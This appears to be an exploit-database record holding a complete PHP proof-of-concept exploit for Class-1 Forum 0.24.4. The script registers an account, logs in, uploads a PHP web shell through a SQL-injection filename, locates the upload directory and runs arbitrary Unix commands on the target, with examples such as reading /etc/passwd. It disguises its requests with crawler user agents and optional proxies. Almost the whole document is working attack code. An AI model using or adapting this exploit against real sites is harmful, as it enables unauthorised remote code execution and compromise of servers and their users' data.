{
  "id": "1207",
  "title": "Class-1 Forum 0.24.4 - Remote Code Execution",
  "cve": null,
  "vuln_type": "sqli",
  "code": "<?php\r\n\r\n# 6.44 08/09/2005\r\n#\r\n# Class-1 Forum sql injection / remote code execution poc exploit\r\n#\r\n# coded by rgod -> http://rgod.altervista.org\r\n#\r\n# make these changes in php.ini if you have troubles\r\n# with this script:\r\n#\r\n# allow_call_time_pass_reference = on\r\n# register_globals = on\r\n#\r\n# this is my piece of poetry...\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho '<head><title>class1 remote commands execution</title>\r\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n      <style type=\"text/css\">\r\n      <!--\r\n      body,td,th {color: #00FF00;}\r\n      body {background-color: #000000;}\r\n      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }\r\n      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;\r\n\t       font-weight: bold;\r\n\t       font-style: italic;\r\n              }\r\n      -->\r\n      </style></head>\r\n      <body>\r\n      <p class=\"Stile6\">Class-1 Forum (possibly prior versions) remote commands execution</p>\r\n      <p class=\"Stile6\">a script by rgod at <a href=\"http://rgod.altervista.org\" target=\"_blank\">http://rgod.altervista.org</a></p>\r\n      <table width=\"84%\" >\r\n      <tr>\r\n      <td width=\"43%\">\r\n      <form name=\"form1\" method=\"post\" action=\"'.$SERVER[PHP_SELF].'?path=value&host=value&port=value&command=value&proxy=value\">\r\n      <p>\r\n       <input type=\"text\" name=\"host\">\r\n      <span class=\"Stile5\">hostname (ex: www.sitename.com) </span></p>\r\n      <p>\r\n        <input type=\"text\" name=\"path\">\r\n        <span class=\"Stile5\">path (ex: /class1/ or /forum/ or just /) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"port\">\r\n      <span class=\"Stile5\">specify a port other than 80 (default value) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"command\">\r\n        <span class=\"Stile5\">a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"proxy\">\r\n        <span class=\"Stile5\">send exploit through an HTTP proxy (ip:port)  </span></p>\r\n      <p>\r\n          <input type=\"submit\" name=\"Submit\" value=\"go!\">\r\n      </p>\r\n    </form></td>\r\n    </tr>\r\n   </table>\r\n</body>\r\n</html>';\r\n\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".htmlentities($headeri[$li+$ki]).\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".htmlentities($headeri[$li]).\"</td>\";\r\n\t\t\t    }\r\n\r\necho \"</tr></table>\";\r\n}\r\n\r\n\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\n\r\nif (($path<>'') and ($host<>'') and ($command<>''))\r\n{\r\nif ($port=='') {$port=80;}\r\n\r\n\r\n#STEP 1 -> REGISTER\r\n$anumber=rand();\r\n\r\n$data=\"username=jimihendrix\".$anumber.\"&email=jimihendrix\".$anumber.\"@mail.com&password=jimyjimy&password2=jimyjimy&icq=&aim=&msn=&yahoo=&website=http%3A%2F%2F&location=&occupation=&interests=&signature=&notify_private=on&post_count_per_page=10&thread_count_per_page=20&msg_count_per_page=20&date_syntax=D%2C+d+M+Y%2C+G%3Ai%3As\";\r\n\r\nif ($proxy=='')\r\n       {\r\n        $packet=\"POST \".$path.\"users.php?mode=postuser HTTP/1.1\\r\\n\";\r\n\r\n       }\r\nelse\r\n       {\r\n        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);\r\n        if ($c==0) {\r\n                    echo 'check the proxy...<br>';\r\n\t            die;\r\n\t           }\r\n         else\r\n        {\r\n        $packet=\"POST http://\".$host.$path.\"users.php?mode=postuser HTTP/1.1\\r\\n\";\r\n\r\n        }\r\n\t}\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"users.php?mode=register\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=\"Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\\r\\n\\r\\n\";\r\n$packet.=$data;\r\n\r\nshow($packet);\r\n\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\nif ($proxy=='')\r\n{\r\nwhile (!feof($fp))\r\n{\r\n$data.=fgets($fp);\r\n}\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\nfclose($fp);\r\necho nl2br(htmlentities($data));\r\n\r\n#STEP 2 -> LOGIN\r\n$data=\"username=jimihendrix\".$anumber.\"&password=jimyjimy\";\r\nif ($proxy=='')\r\n       {\r\n        $packet=\"POST \".$path.\"login.php HTTP/1.1\\r\\n\";\r\n\r\n       }\r\nelse\r\n       {\r\n\r\n        $packet=\"POST http://\".$host.$path.\"login.php HTTP/1.1\\r\\n\";\r\n\r\n       }\r\n\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"users.php?mode=login\\r\\n\";\r\n$packet.=\"Accept-Language: ru\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=\"Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\\r\\n\\r\\n\";\r\n$packet.=$data;\r\n\r\nshow($packet);\r\n\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\nif ($proxy=='')\r\n{\r\nwhile (!feof($fp))\r\n{\r\n$data.=fgets($fp);\r\n}\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\nfclose($fp);\r\necho nl2br(htmlentities($data));\r\n\r\n\r\n#STEP 3 -> UPLOAD A FILE / SQL INJECTION\r\n\r\n$data='-----------------------------7d51143b10418\r\nContent-Disposition: form-data; name=\"filename\"; filename=\"shell.php.'.\"' or 'a' ='a\".'\"\r\nContent-Type: text/plain\r\n\r\n<?php error_reporting(0); system($HTTP_GET_VARS[command]); ?>\r\n-----------------------------7d51143b10418\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n\r\n-----------------------------7d51143b10418\r\nContent-Disposition: form-data; name=\"subject\"\r\n\r\n\r\n-----------------------------7d51143b10418\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\n\r\n-----------------------------7d51143b10418\r\nContent-Disposition: form-data; name=\"inc_sig\"\r\n\r\n\r\n-----------------------------7d51143b10418--';\r\n\r\nif ($proxy=='')\r\n       {\r\n        $packet=\"POST \".$path.\"viewforum.php?mode=newmessage&reply=1&id=1&forumid=1 HTTP/1.1\\r\\n\";\r\n\r\n       }\r\nelse\r\n       {\r\n\r\n       $packet=\"POST http://\".$host.$path.\"viewforum.php?mode=newmessage&reply=1&id=1&forumid=1 HTTP/1.1\\r\\n\";\r\n\r\n       }\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"viewforum.php?mode=newmessage&reply=1&id=1&forumid=1\\r\\n\";\r\n$packet.=\"Accept-Language: fr\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d51143b10418\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mediapartners-Google/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=\"Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\\r\\n\\r\\n\";\r\n$packet.=$data;\r\n\r\nshow($packet);\r\n\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\nif ($proxy=='')\r\n{\r\nwhile (!feof($fp))\r\n{\r\n$data.=fgets($fp);\r\n}\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\nfclose($fp);\r\necho nl2br(htmlentities($data));\r\n\r\n\r\n\r\n#STEP 4 -> retrieving upload directory name\r\n\r\nif ($proxy=='')\r\n       {\r\n        $packet=\"GET \".$path.\"viewattach.php HTTP/1.1\\r\\n\";\r\n       }\r\nelse\r\n       {\r\n       $packet=\"GET http://\".$host.$path.\"viewattach.php HTTP/1.1\\r\\n\";\r\n       }\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"viewforum.php?mode=newmessage&reply=1&id=1&forumid=1\\r\\n\";\r\n$packet.=\"Accept-Language: fr\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=\"Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\\r\\n\\r\\n\";\r\n\r\nshow($packet);\r\n\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\nif ($proxy=='')\r\n{\r\nwhile (!feof($fp))\r\n{\r\n$data.=fgets($fp);\r\n}\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\nfclose($fp);\r\necho nl2br(htmlentities($data));\r\n\r\n$location=explode('location: ',$data);\r\n$temp=$location[1];\r\n$temp2=explode('/',$temp);\r\n$location=$temp2[0].'/';\r\n\r\nif ($location=='') {\r\n\t\t   echo 'Some problem to retrieve upload directory...<br>';\r\n\t\t   echo 'check this url manually... -> <a href=\"http://'.$host.':'.$port.$path.'viewattach.php\" target=\"_blank\">http://'.$host.':'.$port.$path.'viewattach.php</a><br>';\r\n\t\t   echo 'you will be redirected to upload dir...<br>';\r\n\t\t   echo 'then append this filename: '.\"shell.php.' or 'a' ='a\".' and type commands <br>';\r\n\t\t   echo 'appending again ?command=[your command] <br>';\r\n\t\t   die;\r\n\t\t  }\r\n\r\necho 'Found ... checking this location -> '.htmlentities($location);\r\n\r\n\r\n#STEP 5 -> Launching commands...\r\n\r\nif ($proxy=='')\r\n       {\r\n        $packet=\"GET \".$path.$location.\"shell.php.'%20or%20'a'%20='a?command=\".urlencode($command).\" HTTP/1.1\\r\\n\";\r\n       }\r\nelse\r\n       {\r\n       $packet=\"GET http://\".$host.$path.$location.\"shell.php.'%20or%20'a'%20='a?command=\".urlencode($command).\" HTTP/1.1\\r\\n\";\r\n       }\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"viewforum.php?mode=newmessage&reply=1&id=1&forumid=1\\r\\n\";\r\n$packet.=\"Accept-Language: fr\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=\"Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\\r\\n\\r\\n\";\r\n\r\nshow($packet);\r\n\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\nif ($proxy=='')\r\n{\r\nwhile (!feof($fp))\r\n{\r\n$data.=fgets($fp);\r\n}\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while (!feof($fp))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\nfclose($fp);\r\necho 'If Class-1 Forum is unpatched and vulnerable, now you will see '.htmlentities($command).' output...';\r\necho nl2br(htmlentities($data));\r\n\r\n}\r\n\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-09-09]",
  "url": "https://www.exploit-db.com/exploits/1207"
}